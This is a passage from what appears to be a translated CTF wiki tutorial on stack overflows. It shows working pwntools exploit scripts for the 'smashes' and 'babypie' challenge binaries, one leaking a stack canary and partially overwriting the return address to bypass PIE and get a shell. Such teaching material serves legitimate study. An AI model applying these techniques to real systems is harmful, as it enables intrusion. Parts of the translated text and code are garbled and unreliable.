<span class="err">0</span><span class="nf">x00007fffffffda68</span><span class="err">│+</span><span class="mi">0x28</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda70</span><span class="err">│+</span><span class="mi">0x30</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda78</span><span class="err">│+</span><span class="mi">0x38</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>

<span class="err">[</span><span class="c1">#0] 0x40080e → call 0x4006c0 &lt;_IO_gets@plt&gt;</span>

<span class="err">──────────────────────────────────────────────────────────</span>

<span class="nf">gef</span><span class="err">➤</span>  <span class="no">print</span> <span class="no">$rsp</span>

<span class="nf">$1</span> <span class="err">=</span> <span class="p">(</span><span class="no">void</span> <span class="p">*)</span> <span class="mi">0x7fffffffda40</span>
</code></pre></div>
<p>It can be seen that the value of rsp is 0x7fffffffda40, then the relative offset is</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="mh">0x00007fffffffdc58</span><span class="o">-</span><span class="mh">0x7fffffffda40</span>

<span class="mi">536</span>

<span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mi">536</span><span class="p">)</span>

<span class="s1">&#39;0x218&#39;</span>
</code></pre></div>
<h4 id="using-the-program">Using the program<a class="headerlink" href="#using-the-program" title="Permanent link">&para;</a></h4>
<p>We construct the application as follows</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>

<span class="n">smash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./smashes&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.jarvisoj.com&#39;</span><span class="p">,</span> <span class="mi">9877</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./smashes&#39;</span><span class="p">)</span>

<span class="n">argv_addr</span> <span class="o">=</span> <span class="mh">0x00007fffffffdc58</span>

<span class="n">name_addr</span> <span class="o">=</span> <span class="mh">0x7fffffffda40</span>

<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x600D20</span>

<span class="n">another_flag_addr</span> <span class="o">=</span> <span class="mh">0x400d20</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="n">argv_addr</span> <span class="o">-</span> <span class="n">name_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">another_flag_addr</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;name? &#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;flag: &#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="c1">#39;bb&amp;#39;)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>Here we get the flag directly, there is no online saying that the flag is not available.</p>
<h3 id="title_1">Title<a class="headerlink" href="#title_1" title="Permanent link">&para;</a></h3>
<ul>
<li>2018 Net Ding Cup - guess</li>
</ul>
<h2 id="partial-overwrite-on-the-stack">partial overwrite on the stack<a class="headerlink" href="#partial-overwrite-on-the-stack" title="Permanent link">&para;</a></h2>
<p>Partial overwrite This technique is applicable in many places. Here we use the partial overwrite on the stack as an example to introduce this idea.</p>
<p>We know that after randomization (ASLR, PIE) is turned on, the lower 12-bit page offset is always fixed regardless of the high-order address, which means that if we can change the low-order offset, we can Control the execution flow of the program to some extent, bypassing PIE protection.</p>
<h3 id="2018-babypie">2018-安恒杯-babypie<a class="headerlink" href="#2018-babypie" title="Permanent link">&para;</a></h3>
<p>Taking the babypie of the Anheng Cup in July 2018 as an example, this kind of utilization technique is analyzed. The binary of the topic is placed in [ctf-challenge] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/">https://github.com/ctf-wiki/ctf-challenges/tree/</a> Master/pwn/stackoverflow/partial_overwrite)</p>
<h4 id="determining-protection_1">Determining protection<a class="headerlink" href="#determining-protection_1" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>babypie: ELF <span class="m">64</span>-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped

<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie&#39;</span>

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      PIE enabled
</code></pre></div>
<p>64-bit dynamically linked file with PIE protection and stack overflow protection enabled</p>
<h4 id="_4">分析程序<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<p>Looking at IDA, it is easy to find the vulnerability point. There are obvious stack overflow vulnerabilities in both inputs. It should be noted that before the input, the program clears the stack space, so we cannot pass the print stack. Information comes to the base of leak binary or libc
<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">sub_960</span> <span class="p">()</span>
<span class="p">{</span>

  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-30h]</span>

  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>



  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mf">0L</span><span class="n">L</span><span class="p">);</span>

<span class="o">*</span> <span class="p">(</span><span class="n">_</span> <span class="n">OWORD</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span> <span class="o">=</span> <span class="mi">0uLL</span><span class="p">;</span>
<span class="o">*</span> <span class="p">(</span><span class="n">_</span> <span class="n">OWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">buf</span> <span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0uLL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your Name:&quot;</span><span class="p">);</span>

  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x30uLL</span><span class="p">);</span>                        <span class="c1">// overflow</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Hello %s:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">24</span><span class="p">]);</span>

  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x60uLL</span><span class="p">);</span>                        <span class="c1">// overflow</span>

  <span class="k">return</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></p>
<p>Also found that the program gives a function that can directly get the shell
<div class="highlight"><pre><span></span><code><span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A3E</span> <span class="no">getshell</span>        <span class="no">proc</span> <span class="no">near</span>

<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A3E</span> <span class="c1">; __unwind { .text:0000000000000A3E                 push    rbp</span>

<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A3F</span>                 <span class="no">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>

<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A42</span>                 <span class="no">lea</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">command</span>    <span class="c1">; &quot;/bin/sh&quot;</span>

<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A49</span>                 <span class="no">call</span>    <span class="no">_system</span>

<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A4E</span>                 <span class="no">nop</span>

<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A4F</span>                 <span class="no">pop</span>     <span class="no">rbp</span>

<span class="nl">.text:</span> <span class="err">0000000000000</span><span class="nf">A50</span> <span class="no">retn</span>
<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A50</span> <span class="c1">; } // starts at A3E</span>

<span class="nl">.text:</span><span class="err">0000000000000</span><span class="nf">A50</span> <span class="no">getshell</span>        <span class="no">endp</span>
</code></pre></div></p>
<p>So we just have to control rip to this function.</p>
<h4 id="leak-canary">leak canary<a class="headerlink" href="#leak-canary" title="Permanent link">&para;</a></h4>
<p>There is an output immediately after the first read, and read does not add \0 to the end of the input, which gives us the opportunity to leak the contents of the stack.</p>
<p>In order to control the return address for the second overflow, we choose leak canary. It can be calculated that the length of the first read is 0x30 - 0x8 + 1 (+ 1 is to cover the value of the lowest bit of canary is non-zero, printf uses % s, when the end of \0 is encountered, when the canary low is over non-zero, canary can be printed by printf)</p>
<div class="highlight"><pre><span></span><code><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0x0000557c8443aa08</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>

<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>

<span class="err">──────────────────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────────</span>

 <span class="nf">RAX</span>  <span class="mi">0x0</span>

 <span class="nf">RBX</span>  <span class="mi">0x0</span>

 <span class="nf">RCX</span>  <span class="mi">0x7f1898a64690</span> <span class="p">(</span><span class="no">__read_nocancel</span><span class="err">+</span><span class="mi">7</span><span class="p">)</span> <span class="err">◂—</span> <span class="no">cmp</span>    <span class="no">rax</span><span class="p">,</span> <span class="mi">-0</span><span class="no">xfff</span>

 <span class="nf">RDX</span>  <span class="mi">0x30</span>

 <span class="nf">RDI</span>  <span class="mi">0x557c8443ab15</span> <span class="err">◂—</span> <span class="no">insb</span>   <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rdi</span><span class="p">],</span> <span class="no">dx</span> <span class="cm">/* &#39;Hello %s:\n&#39; */</span>

 <span class="nf">RSI</span>  <span class="mi">0x7ffd97aa0410</span> <span class="err">◂—</span> <span class="mi">0x6161616161616161</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">aaaaaaaa</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="nf">R8</span>   <span class="mi">0x7f1898f1d700</span> <span class="err">◂—</span> <span class="mi">0x7f1898f1d700</span>

 <span class="nf">R9</span>   <span class="mi">0x7f1898f1d700</span> <span class="err">◂—</span> <span class="mi">0x7f1898f1d700</span>

 <span class="nf">R10</span>  <span class="mi">0x37b</span>

 <span class="nf">R11</span>  <span class="mi">0x246</span>

 <span class="nf">R12</span>  <span class="mi">0x557c8443a830</span> <span class="err">◂—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>

 <span class="nf">R13</span>  <span class="mi">0x7ffd97aa0540</span> <span class="err">◂—</span> <span class="mi">0x1</span>

 <span class="nf">R14</span>  <span class="mi">0x0</span>

 <span class="nf">R15</span>  <span class="mi">0x0</span>

 <span class="nf">RBP</span>  <span class="mi">0x7ffd97aa0440</span> <span class="err">—▸</span> <span class="mi">0x7ffd97aa0460</span> <span class="err">—▸</span> <span class="mi">0x557c8443aa80</span> <span class="err">◂—</span> <span class="no">push</span>   <span class="no">r15</span>

 <span class="nf">RSP</span>  <span class="mi">0x7ffd97aa0410</span> <span class="err">◂—</span> <span class="mi">0x6161616161616161</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">aaaaaaaa</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="nf">RIP</span>  <span class="mi">0x557c8443aa08</span> <span class="err">◂—</span> <span class="no">call</span>   <span class="mi">0x557c8443a7e0</span>

<span class="err">──────────────────────────────────────────────────</span> <span class="err">─</span> <span class="err">[</span><span class="nf">DISASM</span><span class="p">]</span> <span class="err">───────────────────────────────────────────────────</span> <span class="err">──────</span>
 <span class="err">►</span> <span class="err">0</span><span class="nf">x557c8443aa08</span>    <span class="no">call</span>   <span class="mi">0x557c8443a7e0</span>



   <span class="err">0</span><span class="nf">x557c8443aa0d</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x30</span><span class="p">]</span>

   <span class="err">0</span><span class="nf">x557c8443aa11</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span> <span class="mi">0x60</span>

   <span class="err">0</span><span class="nf">x557c8443aa16</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>
<span class="err">0</span><span class="nf">x557c8443aa19</span> <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x557c8443aa1e</span>    <span class="no">call</span>   <span class="mi">0x557c8443a7f0</span>



   <span class="err">0</span><span class="nf">x557c8443aa23</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>

<span class="err">0</span><span class="nf">x557c8443aa28</span> <span class="no">mov</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x557c8443aa2c</span>    <span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>

   <span class="err">0</span><span class="nf">x557c8443aa35</span>    <span class="no">je</span>     <span class="mi">0x557c8443aa3c</span>



   <span class="err">0</span><span class="nf">x557c8443aa37</span>    <span class="no">call</span>   <span class="mi">0x557c8443a7c0</span>

<span class="err">────────────────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────────────────</span>

<span class="err">00:0000│</span> <span class="nf">rsi</span> <span class="no">rsp</span>  <span class="mi">0x7ffd97aa0410</span> <span class="err">◂—</span> <span class="mi">0x6161616161616161</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">aaaaaaaa</span><span class="err">&#39;</span><span class="p">)</span>

<span class="na">...</span> <span class="err">↓</span>

<span class="err">05:0028│</span>          <span class="err">0</span><span class="nf">x7ffd97aa0438</span> <span class="err">◂—</span> <span class="mi">0xb3012605fc402a61</span>

<span class="err">06:0030│</span> <span class="nf">rbp</span>      <span class="mi">0x7ffd97aa0440</span> <span class="err">—▸</span> <span class="mi">0x7ffd97aa0460</span> <span class="err">—▸</span> <span class="mi">0x557c8443aa80</span> <span class="err">◂—</span> <span class="no">push</span>   <span class="no">r15</span>

<span class="err">07:0038│</span>          <span class="err">0</span><span class="nf">x7ffd97aa0448</span> <span class="err">—▸</span> <span class="mi">0x557c8443aa6a</span> <span class="err">◂—</span> <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>

<span class="nf">Breakpoint</span> <span class="p">*(</span><span class="mi">0x557c8443a000</span><span class="err">+</span><span class="mi">0xA08</span><span class="p">)</span>

<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">canary</span>

<span class="nf">$1</span> <span class="err">=</span> <span class="mi">0</span>

<span class="nf">canary</span> <span class="p">:</span> <span class="mi">0xb3012605fc402a00</span>

<span class="nf">pwndbg</span><span class="err">&amp;</span><span class="no">gt</span><span class="c1">;</span>
</code></pre></div>
<p>Canary In the rbp - 0x8 position, it can be seen that the lower bit of the canary has been overwritten to 0x61, so as long as the 7 bits after &#39;a&#39; * (0x30 - 0x8 + 1) are received, plus the lowest bit &#39; 0&#39;, we will recover the canary of the program.</p>
<h4 id="override-return-address">Override return address<a class="headerlink" href="#override-return-address" title="Permanent link">&para;</a></h4>
<p>With canary, you can overwrite the return address with the second stack overflow, and control the return address to the getshell function. Let&#39;s first look at the return address when there is no overflow.</p>
<div class="highlight"><pre><span></span><code><span class="err">0</span><span class="nf">x000055dc43694a1e</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>

<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>

<span class="err">──────────────────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────────</span>

 <span class="nf">RAX</span>  <span class="mi">0x7fff9aa3af20</span> <span class="err">◂—</span> <span class="mi">0x6161616161616161</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">aaaaaaaa</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="nf">RBX</span>  <span class="mi">0x0</span>

 <span class="nf">RCX</span>  <span class="mi">0x7f206c6696f0</span> <span class="p">(</span><span class="no">__write_nocancel</span><span class="err">+</span><span class="mi">7</span><span class="p">)</span> <span class="err">◂—</span> <span class="no">cmp</span>    <span class="no">rax</span><span class="p">,</span> <span class="mi">-0</span><span class="no">xfff</span>

 <span class="nf">RDX</span>  <span class="mi">0x60</span>

 <span class="nf">RDI</span>  <span class="mi">0x0</span>

 <span class="nf">RSI</span>  <span class="mi">0x7fff9aa3af20</span> <span class="err">◂—</span> <span class="mi">0x6161616161616161</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">aaaaaaaa</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="nf">R8</span>   <span class="mi">0x7f206cb22700</span> <span class="err">◂—</span> <span class="mi">0x7f206cb22700</span>

 <span class="nf">R9</span>   <span class="mi">0x3e</span>

 <span class="nf">R10</span>  <span class="mi">0x73</span>

 <span class="nf">R11</span>  <span class="mi">0x246</span>

 <span class="nf">R12</span>  <span class="mi">0x55dc43694830</span> <span class="err">◂—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>

 <span class="nf">R13</span>  <span class="mi">0x7fff9aa3b050</span> <span class="err">◂—</span> <span class="mi">0x1</span>

 <span class="nf">R14</span>  <span class="mi">0x0</span>

 <span class="nf">R15</span>  <span class="mi">0x0</span>

 <span class="nf">RBP</span>  <span class="mi">0x7fff9aa3af50</span> <span class="err">—▸</span> <span class="mi">0x7fff9aa3af70</span> <span class="err">—▸</span> <span class="mi">0x55dc43694a80</span> <span class="err">◂—</span> <span class="no">push</span>   <span class="no">r15</span>

 <span class="nf">RSP</span>  <span class="mi">0x7fff9aa3af20</span> <span class="err">◂—</span> <span class="mi">0x6161616161616161</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">aaaaaaaa</span><span class="err">&#39;</span><span class="p">)</span>

 <span class="nf">RIP</span>  <span class="mi">0x55dc43694a1e</span> <span class="err">◂—</span> <span class="no">call</span>   <span class="mi">0x55dc436947f0</span>

<span class="err">──────────────────────────────────────────────────</span> <span class="err">─</span> <span class="err">[</span><span class="nf">DISASM</span><span class="p">]</span> <span class="err">───────────────────────────────────────────────────</span> <span class="err">──────</span>
   <span class="err">0</span><span class="nf">x55dc43694a08</span>    <span class="no">call</span>   <span class="mi">0x55dc436947e0</span>



   <span class="err">0</span><span class="nf">x55dc43694a0d</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x30</span><span class="p">]</span>

   <span class="err">0</span><span class="nf">x55dc43694a11</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span> <span class="mi">0x60</span>

   <span class="err">0</span><span class="nf">x55dc43694a16</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span> <span class="no">rax</span>

   <span class="err">0</span><span class="nf">x55dc43694a19</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0</span>

 <span class="err">►</span> <span class="err">0</span><span class="nf">x55dc43694a1e</span>    <span class="no">call</span>   <span class="mi">0x55dc436947f0</span>



   <span class="err">0</span><span class="nf">x55dc43694a23</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>

<span class="err">0</span><span class="nf">x55dc43694a28</span> <span class="no">mov</span> <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">8</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x55dc43694a2c</span>    <span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">0x28</span><span class="p">]</span>

   <span class="err">0</span><span class="nf">x55dc43694a35</span>    <span class="no">je</span>     <span class="mi">0x55dc43694a3c</span>



   <span class="err">0</span><span class="nf">x55dc43694a37</span>    <span class="no">call</span>   <span class="mi">0x55dc436947c0</span>

<span class="err">────────────────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────────────────</span>

<span class="err">00:0000│</span> <span class="nf">rax</span> <span class="no">rsi</span> <span class="no">rsp</span>  <span class="mi">0x7fff9aa3af20</span> <span class="err">◂—</span> <span class="mi">0x6161616161616161</span> <span class="p">(</span><span class="err">&#39;</span><span class="no">aaaaaaaa</span><span class="err">&#39;</span><span class="p">)</span>

<span class="na">...</span> <span class="err">↓</span>

<span class="err">05:0028│</span>              <span class="err">0</span><span class="nf">x7fff9aa3af48</span> <span class="err">◂—</span> <span class="mi">0xbfe0cfbabccd2861</span>

<span class="err">06:0030│</span> <span class="nf">rbp</span>          <span class="mi">0x7fff9aa3af50</span> <span class="err">—▸</span> <span class="mi">0x7fff9aa3af70</span> <span class="err">—▸</span> <span class="mi">0x55dc43694a80</span> <span class="err">◂—</span> <span class="no">push</span>   <span class="no">r15</span>

<span class="err">07:0038│</span>              <span class="err">0</span><span class="nf">x7fff9aa3af58</span> <span class="err">—▸</span> <span class="mi">0x55dc43694a6a</span> <span class="err">◂—</span> <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>

<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">i</span> <span class="p">(</span><span class="mi">0x0A3E</span><span class="err">+</span><span class="mi">0x55dc43694000</span><span class="p">)</span> 

   <span class="mi">0x55dc43694a3e</span><span class="p">:</span>  <span class="no">push</span>   <span class="no">rbp</span>

   <span class="err">0</span><span class="nl">x55dc43694a3f:</span>  <span class="nf">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>

   <span class="err">0</span><span class="nl">x55dc43694a42:</span>  <span class="nf">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xd7</span><span class="p">]</span>        <span class="c1"># 0x55dc43694b20</span>

   <span class="err">0</span><span class="nl">x55dc43694a49:</span>  <span class="nf">call</span>   <span class="mi">0x55dc436947d0</span>

   <span class="err">0</span><span class="nl">x55dc43694a4e:</span>  <span class="nf">nop</span>

   <span class="err">0</span><span class="nl">x55dc43694a4f:</span>  <span class="nf">pop</span>    <span class="no">rbp</span>

<span class="err">0</span><span class="nl">x55dc43694a50:</span> <span class="nf">right</span>
   <span class="err">0</span><span class="nl">x55dc43694a51:</span>  <span class="nf">push</span>   <span class="no">rbp</span>

   <span class="err">0</span><span class="nl">x55dc43694a52:</span>  <span class="nf">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>

   <span class="err">0</span><span class="nl">x55dc43694a55:</span>  <span class="nf">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</code></pre></div>
<p>It can be found that the return address at this time is different from the 16 bits of the address of the get shell function. If the lower 16 bits are set to <code>0x?A3E</code>, there is a certain probability of getting shell.</p>
<p>The final script is as follows:
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>

<span class="c1"># -*- coding: utf-8 -*-</span>



<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#  context.log_level = &quot;debug&quot;</span>

<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;deepin-terminal&quot;</span><span class="p">,</span> <span class="s2">&quot;-x&quot;</span><span class="p">,</span> <span class="s2">&quot;sh&quot;</span><span class="p">,</span> <span class="s2">&quot;-c&quot;</span><span class="p">]</span>



<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>

    <span class="k">try</span><span class="p">:</span>

        <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./babypie&quot;</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>



<span class="c1"># gdb.attach (I)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x30</span> <span class="o">-</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;a&amp;#39; * (0x30 - 0x8 + 1))</span>
<span class="n">canary</span> <span class="o">=</span> <span class="o">&amp;</span><span class="c1">#39;0&amp;#39; + io.recvn (7)</span>
        <span class="n">success</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>



<span class="c1"># gdb.attach (I)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&quot;:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x30</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="s1">&#39;bbbbbbbb&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x3E\x0A</span><span class="s1">&#39;</span><span class="p">)</span>



<span class="n">io</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>

<span class="n">io</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
<span class="nb">print</span> <span class="n">e</span>
</code></pre></div></p>
<p>It should be noted that this technique is not only effective on the stack, but also an effective means of bypassing address randomization on the heap.</p>
<h3 id="2018-xnuca-gets">2018-XNUCA-gets<a class="headerlink" href="#2018-xnuca-gets" title="Permanent link">&para;</a></h3>
<p>This topic is also very interesting, as follows</p>
